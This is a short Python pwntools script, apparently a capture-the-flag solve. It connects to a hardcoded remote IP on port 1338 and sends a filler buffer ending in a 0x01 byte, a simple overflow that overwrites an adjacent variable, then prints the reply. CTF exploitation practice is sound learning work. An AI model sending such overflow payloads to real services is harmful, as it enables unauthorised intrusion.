#!/bin/env python3
import sys
from pwn import *

conn = remote('170.64.222.246', 1338)

buffer = b"AAAABBBBCCCCDDDD\x01\n"
conn.send(buffer)

print(conn.recvall(3))

conn.close()
# sys.stdout.buffer.write(buffer.encode('utf-8'))
# sys.stdout.buffer.write(buffer)